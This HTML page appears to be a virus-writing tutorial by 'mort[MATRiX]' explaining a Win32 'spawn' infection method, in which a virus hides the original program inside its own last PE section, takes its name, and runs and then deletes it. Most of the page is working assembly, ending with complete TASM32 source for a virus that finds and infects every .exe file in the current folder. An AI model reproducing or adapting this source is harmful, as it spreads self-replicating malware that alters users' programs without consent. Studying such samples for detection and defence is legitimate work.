<html>

<head>
<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
<title>Spawn Infection</title>
</head>

<body bgcolor="#FFFFFF" text="#000000">

<p><img src="spawn.gif" width="310" height="22" alt="spawn.gif (4554 bytes)"></p>

<p><small><font face="Verdana"><small><br>
This text is for educational purpose only. Author is not responsibile for any damage this
informations could cause. Anyway, enjoy it,...<br>
<br>
Well, this is my very first article, so i hope u'll be tolerant to my english, and other
possible bugs,...anyway if not - fuck u... I managed to create this article, 'coz i havent
seen any on this theme.<br>
<br>
So, spawn infection. This infection is known from DOS times, when virus rename itself like
host but with the COM extensin, and when user typedname of the host, virus was loaded
first, it did its work, and then it loaded host. In w32 world, i think there's no
possibility of using COM extension at all. I saw some virus, where the host was carried in
other file with some other extension. Yes, it is possibility, but i think my method (sure,
i dont know, if i invented it, but nobody told me that..) is prettier, 'coz i use only
host name, and no other files.</small></font></small></p>

<p><small><font face="Verdana"><small><br>
<font color="#FF0000">infection idea</font><br>
<br>
Assume, that virus was loaded, infected some files (c later bout this topic), and we're
going to load our host file. I said, that i dont use any other file, so where's host?
Well, host is in the last section of our virus file. Actually, i remove the host file to
last section of virus, and rename virus by the host name. (comment - reality is a little
bit different) To load host like a process, we have to create new file and copy there
contents of this section. When host'll finished its work, virus delete it (c later bout
this topic).<br>
<br>
There's one little problem in this part. If we create new file with host name, there'll be
two files with same name. Hmmm, i solved it by adding 0ffh byte infront of the name of
host. I know it's a little bit strange, but i have no idea how to solve it(if some idea,
contact me).<br>
<br>
<font color="#FF0000">load process<br>
</font><br>
To load a process, we have CreateProcess API. To use it, we need to know some structures.
I'll describe them very quickly.<br>
<br>
---------------------<br>
.startupinfo structure - there's only one thing u have to set and it is<br>
--------------------- size of structure - cb.<br>
Others fields should be nulls.<br>
<br>
...<br>
mov dword ptr [_si.cb],_siSize<br>
...<br>
<br>
startUpInfo struct<br>
cb dd ?<br>
lpReserved dd ?<br>
lpDesktop dd ?<br>
lpTitle dd ?<br>
dwX dd ?<br>
dwY dd ?<br>
dwXSize dd ?<br>
dwYSize dd ?<br>
dwXCountChars dd ?<br>
dwYCountChars dd ?<br>
dwFillAttribute dd ?<br>
dwFlags dd ?<br>
wShowWindow dw ?<br>
cbReserved2 dw ?<br>
lpReserved2 dd ?<br>
hStdInput dd ?<br>
hStdOutput dd ?<br>
hStdError dd ?<br>
startUpInfo ends<br>
<br>
-----------------------------<br>
.process information structure - this is init by API itself<br>
-----------------------------<br>
<br>
process_information struct<br>
hProcess dd ?&nbsp;&nbsp;&nbsp; ;here'll be new process handle<br>
hThread dd ? ; -//- -//- thread -//-<br>
dwProcessId dd ?<br>
dwThreadId dd ?<br>
process_information ends<br>
<br>
-----------------------------<br>
.security attributes structure - this struc gives attributes to new<br>
----------------------------- procces and new threads, so we need <br>
to declare two vars with this struc.<br>
<br>
<br>
_saProcess security_attributes &lt;&gt;<br>
_saThread security_attributes &lt;&gt;<br>
<br>
There're some thing we have to init. First it is size of actuall structure. The next is
bInheritHandle. This var can have to state: TRUE or FLASE. We need to inherit handles of
new process, to know when the process finished its work.<br>
<br>
...<br>
mov dword ptr [_saProcess.nLength],_saSize<br>
mov dword ptr [_saProcess.bInheritHandle],1 ;TRUE<br>
mov dword ptr [_saThread.nLength],_saSize<br>
mov dword ptr [_saThread.bInheritHandle],1 ;TRUE<br>
...<br>
<br>
security_attributes struct<br>
nLength dd ?<br>
lpSecurityDescriptor dd ?<br>
bInheritHandle dd ?<br>
security_attributes ends<br>
<br>
<br>
Finally we can call CreateProcess by this prototype:<br>
(xxxP - pointer)<br>
<br>
push process_informationP<br>
push startupinfoP<br>
push current_directoryP ;set to null<br>
push enviroment ;set to null<br>
push create ;set to null<br>
push inherit_handles ;set to 1<br>
push security_attributes_threadP<br>
push security_attributes_processP<br>
push command_lineP<br>
push host_nameP<br>
<br>
call CreateProcess<br>
<br>
<br>
<font color="#FF0000">wait for end of host process</font></small></font></small></p>

<p><small><font face="Verdana"><small><br>
Assume, we ran host by CreateProcess API, and we have handle of it. Wehave to wait until
the host process will finish it's work. This is done by WaitForSingleObject API.<br>
<br>
push timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;time we'll wait for object<br>
push handle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;handle we wait for<br>
<br>
call WaitForSingleObject<br>
<br>
return:<br>
eax = 0 - process was finished, we can delete the host file<br>
eax = -1 - some error occured, we can chcek it by GetLastError API<br>
<br>
I set timeout to _INFINITE - means, we'll wait until process end.<br>
Naturally, there're other values it could be set.<br>
<br>
<br>
<font color="#FF0000">infection</font><br>
<br>
I know, that there're many ways of spawn infecting, but i'll describe only one - mine.
Assume, that we found some file, we want to infect, and we mapped it. We have to allocate
space for host.<br>
<br>
...<br>
call GlobalAlloc,_MEM_ZEROINIT or _MEM_FIXED,[_memSize]<br>
mov [_memBase],eax<br>
<br>
Then we store host to new mem space.<br>
<br>
mov edi,eax<br>
mov esi,[_hostMapAddres]<br>
push esi esi
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;for code below<br>
mov ecx,[_fileSearch.FileSizeLow]<br>
rep movsb<br>
<br>
Now, we start copying our virus body to the host file. First, we copy the MZ and PE header<br>
<br>
pop edi<br>
mov esi,_imageBase<br>
mov ecx,_1stcopy&nbsp;&nbsp;&nbsp; ; 02c0h<br>
push edi<br>
rep movsb<br>
<br>
Now, we have to look at sections' headers and copy their bodies to be like in EXE file,
because what we have now is process.<br>
<br>
pop ebx<br>
add ebx,_1stheader ;offset of first section's header<br>
mov ecx,_secCount ;4<br>
<br>
@nextSection:<br>
pop edi<br>
push edi ecx<br>
add edi,[ebx + 014h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;sec's physical offset<br>
mov ecx,[ebx + 010h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;sec's physical size<br>
mov esi,_imageBase<br>
add esi,[ebx + 0ch]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;virtual offset<br>
rep movsb<br>
add ebx,028h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;see next
sec's header<br>
pop ecx<br>
dec ecx<br>
jnz @nextSection<br>
<br>
Now, we copied bodies of four sections, but there're five in our body. (the last one is
debug section, bcoz i compile it with debug inf.) We have to set this header to carry our
host.<br>
<br>
pop edi<br>
push edi<br>
mov eax,[_fileSearch.FileSizeLow]<br>
<br>
push eax eax ;for sec allign and for copy<br>
<br>
mov ecx,_fileAllign&nbsp;&nbsp;&nbsp; ;file allign - 0200h - usually ;)<br>
xor edx,edx<br>
div ecx<br>
inc eax<br>
mul ecx ;alligned value of new sec size<br>
<br>
mov word ptr [edi + 038h],'TM' ;stupid infection mark,...<br>
<br>
add [edi + 0150h],eax ;add image size<br>
add edi,[ebx + 014h] ;where to copy<br>
mov esi,[_memBase] ;offset we stored host<br>
mov [ebx + 010h],eax&nbsp;&nbsp;&nbsp; ;sec's phys. size<br>
<br>
pop eax<br>
mov ecx,_sectionAllign&nbsp;&nbsp;&nbsp; ;mem allign - 01000h - x86 rulez<br>
xor edx,edx<br>
div ecx<br>
inc eax<br>
mul ecx<br>
<br>
mov [ebx + 08h],eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;new mem size<br>
<br>
pop ecx&nbsp;&nbsp;&nbsp;&nbsp; ;bytes to copy<br>
rep movsb<br>
<br>
pop eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;host map addres<br>
xchg edi,eax<br>
sub eax,edi ;new file size: vir + host<br>
<br>
mov [_newFileSize],eax&nbsp;&nbsp;&nbsp; ;for SetFilePointer<br>
<br>
call GlobalFree,[_memBase]&nbsp;&nbsp;&nbsp; ;very usefull<br>
<br>
<br>
Well, now we have in _hostMapAddres our virus like a valid EXE, with host file in the last
section. Now we have to unmap it, and set file pointer to '_newFileSize' value.<br>
<br>
<font color="#FF0000">execute host</font></small></font></small></p>

<p><small><font face="Verdana"><small><br>
After all infection work, we are going to execute host. We have to create file with host
name, (u remember the 0ffh byte,...) map it, and copy there our host from last section.<br>
<br>
mov edi,eax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;map addres<br>
mov esi,_imageBase + _lastSecOffs&nbsp;&nbsp;&nbsp; ;lastsecoffset + 014<br>
lodsd
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;RVA value<br>
add eax,_imageBase<br>
xchg eax,esi<br>
mov ecx,[_hostSize1]<br>
rep movsb<br>
<br>
Now, we have to close it, and set structures for CreateProcess API.<br>
<br>
mov dword ptr [_si.cb],_siSize<br>
mov dword ptr [_saProcess.nLength],_saSize<br>
mov dword ptr [_saProcess.bInheritHandle],1<br>
mov dword ptr [_saThread.nLength],_saSize<br>
mov dword ptr [_saThread.bInheritHandle],1<br>
<br>
And finally:<br>
<br>
call CreateProcessA,offset _execName,0,offset _saProcess,<br>
offset _saThread,1,0,0,0,offset _si,offset _pi<br>
<br>
And now, there's time for waiting, until process will shut down,...<br>
<br>
call WaitForSingleObject,_pi.hProcess,_INFINITE<br>
<br>
call CloseHandle,offset _pi.hThread&nbsp;&nbsp;&nbsp; ;needed<br>
call CloseHandle,offset _pi.hProcess<br>
<br>
push offset _execName<br>
call DeleteFileA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;delete host<br>
<br>
<br>
Known bug - this version of spawn wont work right with files, which needs some specified
command line stuff, but if u understand this article im sure u are able to fix it,...<br>
no mood to do it, anyway, c it in my spawn resident soon<br>
<br>
Thats all,...<br>
<br>
I include source of my spawn virus. It was made for this article, so there're many ways
that could be optimized , added or deleted. It works on w98, so i suppose it works on w95.
Anyway im not sure if it works under win NT, bcoz i havent it.<br>
<br>
<font color="#FF0000">mort[MATRiX]</font><br>
<br>
email - mort.matrix@post.cz<br>
site - http://altern.org/mvx<br>
<br>
<font color="#FF0000">cut it where u want, but i think heer it'll best</font><br>
<br>
comment &quot;<br>
spawn by mort[MATRiX]<br>
<br>
TASM32 /ml /m /zi spawn.asm<br>
TLINK32 -Tpe -aa -c -x -v spawn.obj,,,import32.lib<br>
wcsec spawn.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;ok,
pewrsec forewer,...<br>
&quot;<br>
<br>
.386<br>
.model flat,stdcall<br>
<br>
;------------------------------------------------( externals )-------------<br>
<br>
extrn MessageBoxA : proc<br>
extrn ExitProcess : proc<br>
extrn CreateProcessA : proc<br>
extrn FindFirstFileA : proc<br>
extrn FindNextFileA : proc<br>
extrn CreateFileMappingA : proc<br>
extrn MapViewOfFile : proc<br>
extrn UnmapViewOfFile : proc<br>
extrn&nbsp;&nbsp;&nbsp;&nbsp; SetFileAttributesA : proc<br>
extrn CreateFileA : proc<br>
extrn CloseHandle : proc<br>
extrn GlobalAlloc : proc<br>
extrn GlobalFree : proc<br>
extrn WaitForSingleObject : proc<br>
extrn SetFilePointer : proc<br>
extrn SetEndOfFile : proc<br>
extrn DeleteFileA : proc<br>
extrn GetCommandLineA : proc<br>
<br>
;------------------------------------------------( structures )------------<br>
<br>
max_path = 260<br>
filetime struc<br>
FT_dwLowDateTime DD ?<br>
FT_dwHighDateTime DD ?<br>
filetime ends<br>
<br>
fileSearch struc<br>
FileAttributes DD ?<br>
CreationTime filetime ?<br>
LastAccessTime filetime ?<br>
LastWriteTime filetime ?<br>
FileSizeHigh DD ?<br>
FileSizeLow DD ?<br>
Reserved0 DD ?<br>
Reserved1 DD ?<br>
FileName DB max_path DUP (?)<br>
AlternateFileName DB 13 DUP (?)<br>
DB 3 DUP (?)<br>
fileSearch ends<br>
<br>
startUpInfo struct<br>
cb dd ?<br>
lpReserved dd ?<br>
lpDesktop dd ?<br>
lpTitle dd ?<br>
dwX dd ?<br>
dwY dd ?<br>
dwXSize dd ?<br>
dwYSize dd ?<br>
dwXCountChars dd ?<br>
dwYCountChars dd ?<br>
dwFillAttribute dd ?<br>
dwFlags dd ?<br>
wShowWindow dw ?<br>
cbReserved2 dw ?<br>
lpReserved2 dd ?<br>
hStdInput dd ?<br>
hStdOutput dd ?<br>
hStdError dd ?<br>
startUpInfo ends<br>
<br>
process_information struct<br>
hProcess dd ?<br>
hThread dd ?<br>
dwProcessId dd ?<br>
dwThreadId dd ?<br>
process_information ends<br>
<br>
security_attributes struct<br>
nLength dd ?<br>
lpSecurityDescriptor dd ?<br>
bInheritHandle dd ?<br>
security_attributes ends<br>
<br>
;------------------------------------------------( undef data )------------<br>
<br>
.data?<br>
<br>
_si startUpInfo &lt;&gt;<br>
_pi process_information &lt;&gt;<br>
_saProcess security_attributes &lt;&gt;<br>
_saThread security_attributes &lt;&gt;<br>
_fileSearch fileSearch &lt;&gt;<br>
<br>
_hostFileHandle dd ? ;map variables<br>
_hostMapHandle dd ?<br>
_hostMapAddres dd ?<br>
_memSize dd ? ;mem alloc variables<br>
_memBase dd ?<br>
_newFileSize dd ? ;new file size of host<br>
<br>
_execName db ?<br>
_hostName1 db 0100h dup(?) ;new of our host<br>
_hostSize1 dd ? ;host file size<br>
<br>
;------------------------------------------------( data )------------------<br>
<br>
.data<br>
<br>
_INFINITE = -1<br>
_CREATE_NEW = 1<br>
_MEM_FIXED = 0<br>
_MEM_ZEROINIT = 040h<br>
_imageBase = 0400000h<br>
_1stcopy = 02c0h ;static part of our exe<br>
_1stheader = 01f8h ;1st header relative<br>
_secCount = 4 ;number of sections we have<br>
_saSize = 12<br>
_piSize = 16<br>
_siSize = 68<br>
_vSize = 04000h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;i like this number<br>
_lastSecOffs = 01f8h + 4*028h + 0ch<br>
_fileAllign = 0200h<br>
_sectionAllign = 01000h<br>
<br>
_title db '.spawn by mort[MATRiX]',0<br>
_mes db 'bleah,...',0<br>
_mask db '*.exe',0<br>
<br>
_hostName db 0100h dup(0)<br>
_hostSize dd ?<br>
<br>
;------------------------------------------------( code )------------------<br>
<br>
.code<br>
@spawn:<br>
mov [_execName],0ffh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;0ffh shit,...<br>
mov esi,offset _hostName<br>
mov edi,offset _hostName1<br>
mov ecx,0100h<br>
rep movsb<br>
mov eax,[_hostSize]<br>
mov [_hostSize1],eax<br>
<br>
call FindFirstFileA,offset _mask,offset _fileSearch<br>
inc eax<br>
jz @noFileInDirectory<br>
<br>
@nextFile:<br>
push eax<br>
<br>
call @infect<br>
<br>
pop eax<br>
dec eax<br>
call FindNextFileA,eax,offset _fileSearch<br>
or eax,eax<br>
jnz @nextFile<br>
<br>
@noFileInDirectory:<br>
jmp @exeHost<br>
<br>
;------------------------------------( infection )-------------------------<br>
@infect:<br>
call SetFileAttributesA,offset _fileSearch.FileName,080h<br>
call CreateFileA,offset _fileSearch.FileName,/<br>
80000000h or 40000000h,1,0,3,0,0<br>
<br>
inc eax<br>
jz @bad1<br>
dec eax<br>
<br>
mov [_hostFileHandle],eax<br>
mov ebx,[_fileSearch.FileSizeLow]<br>
mov [_newFileSize],ebx<br>
<br>
add ebx,_vSize<br>
push ebx ;save bytes to map<br>
mov [_memSize],ebx ;&amp; store it<br>
<br>
call CreateFileMappingA,eax,0,4,0,ebx,0<br>
mov [_hostMapHandle],eax<br>
call MapViewOfFile,eax,2,0,0<br>
mov [_hostMapAddres],eax<br>
<br>
cmp word ptr [eax + 038h],'TM'<br>
jz @bad2<br>
<br>
call @finalInfection<br>
<br>
@bad2:<br>
push dword ptr [_hostMapAddres]<br>
call UnmapViewOfFile<br>
push dword ptr [_hostMapHandle]<br>
call CloseHandle<br>
<br>
push 0 0<br>
push [_newFileSize]<br>
push [_hostFileHandle]<br>
call SetFilePointer<br>
push [_hostFileHandle]<br>
call SetEndOfFile<br>
<br>
push dword ptr [_hostFileHandle]<br>
call CloseHandle<br>
<br>
call SetFileAttributesA,offset _fileSearch.FileName,<br>
[_fileSearch.FileAttributes]<br>
<br>
@bad1:<br>
ret<br>
<br>
;----------------------------------------( whoops )------------------------<br>
@finalInfection:<br>
mov edi,offset _hostName ;some needed stuff<br>
mov esi,offset _fileSearch.FileName<br>
mov ecx,0100h<br>
rep movsb<br>
mov eax,[_fileSearch.FileSizeLow]<br>
mov [_hostSize],eax<br>
<br>
call GlobalAlloc,_MEM_ZEROINIT or _MEM_FIXED,[_memSize]<br>
mov [_memBase],eax<br>
<br>
mov edi,eax ;store host<br>
mov esi,[_hostMapAddres]<br>
push esi esi<br>
mov ecx,[_fileSearch.FileSizeLow]<br>
rep movsb<br>
<br>
pop edi<br>
mov esi,_imageBase ;copy the static part<br>
mov ecx,_1stcopy<br>
push edi<br>
rep movsb<br>
<br>
pop ebx<br>
add ebx,_1stheader<br>
mov ecx,_secCount<br>
<br>
@nextSection:<br>
pop edi<br>
push edi ecx<br>
add edi,[ebx + 014h]<br>
mov ecx,[ebx + 010h]<br>
mov esi,_imageBase<br>
add esi,[ebx + 0ch]<br>
rep movsb<br>
add ebx,028h<br>
pop ecx<br>
dec ecx<br>
jnz @nextSection<br>
<br>
pop edi<br>
push edi<br>
mov eax,[_fileSearch.FileSizeLow]<br>
<br>
push eax eax ;for sec allign and for copy<br>
<br>
mov ecx,_fileAllign<br>
xor edx,edx<br>
div ecx<br>
inc eax<br>
mul ecx ;alligned value of new sec size<br>
<br>
mov word ptr [edi + 038h],'TM' ;aaaaaaaaaaaaah<br>
<br>
add [edi + 0150h],eax ;add image size<br>
add edi,[ebx + 014h] ;where to copy<br>
mov esi,[_memBase]<br>
mov [ebx + 010h],eax<br>
pop eax<br>
mov ecx,_sectionAllign<br>
xor edx,edx<br>
div ecx<br>
inc eax<br>
mul ecx<br>
mov [ebx + 08h],eax<br>
<br>
pop ecx ;bytes to copy<br>
rep movsb<br>
pop eax<br>
xchg edi,eax<br>
sub eax,edi ;new file size: vir + host<br>
<br>
mov [_newFileSize],eax<br>
<br>
call GlobalFree,[_memBase]<br>
ret<br>
<br>
;----------------------------------------( execute host )------------------<br>
@exeHost:<br>
cmp [_hostName1],0<br>
jz @firstExecuting<br>
<br>
call CreateFileA,offset _execName,80000000h or /<br>
40000000h,1,0,_CREATE_NEW,0,0<br>
<br>
mov [_hostFileHandle],eax<br>
mov ebx,[_hostSize1]<br>
<br>
call CreateFileMappingA,eax,0,4,0,ebx,0<br>
mov [_hostMapHandle],eax<br>
call MapViewOfFile,eax,2,0,0,[_hostSize1]<br>
mov [_hostMapAddres],eax<br>
<br>
mov edi,eax<br>
mov esi,_imageBase + _lastSecOffs<br>
lodsd<br>
add eax,_imageBase<br>
xchg eax,esi<br>
mov ecx,[_hostSize1]<br>
rep movsb<br>
<br>
push dword ptr [_hostMapAddres]<br>
call UnmapViewOfFile<br>
push dword ptr [_hostMapHandle]<br>
call CloseHandle<br>
push dword ptr [_hostFileHandle]<br>
call CloseHandle<br>
<br>
<br>
mov dword ptr [_si.cb],_siSize<br>
mov dword ptr [_saProcess.nLength],_saSize<br>
mov dword ptr [_saProcess.bInheritHandle],1<br>
mov dword ptr [_saThread.nLength],_saSize<br>
mov dword ptr [_saThread.bInheritHandle],1<br>
<br>
call CreateProcessA,offset _execName,0,offset _saProcess,offset/<br>
_saThread,1,0,0,0,offset _si,offset _pi<br>
<br>
call WaitForSingleObject,_pi.hProcess,_INFINITE<br>
<br>
call CloseHandle,offset _pi.hThread<br>
call CloseHandle,offset _pi.hProcess<br>
<br>
push offset _execName<br>
call DeleteFileA<br>
<br>
@firstExecuting:<br>
call MessageBoxA,0,offset _mes,offset _title,0<br>
call ExitProcess,0<br>
<br>
end @spawn<br>
<br>
</small></font></small></p>
</body>
</html>
